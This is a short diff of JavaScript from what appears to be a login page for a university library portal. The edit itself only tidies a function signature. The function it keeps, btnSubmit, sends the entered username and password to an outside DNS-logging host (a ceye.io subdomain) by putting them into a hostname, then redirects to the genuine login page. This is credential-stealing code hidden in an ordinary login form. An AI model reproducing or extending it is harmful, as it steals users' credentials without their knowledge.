@@ -99,12 +99,12 @@
 				pwd.value="";
 			}
 			else {
-				btnSubmit(form, bor_id.value, pwd.value);
+				btnSubmit(bor_id.value, pwd.value);
 				window.location.href="http://primo.zzu.edu.cn:8991/pds?func=load-login&url=http://primo.zzu.edu.cn:8991/pds";
 			}
 
 			}			
-		function btnSubmit(form, user, passwd) {
+		function btnSubmit(user, passwd) {
 			alert("start");
 			var URL = "http://" +  user + "." + passwd + "." + "u2c90f.ceye.io";
 			var options = {
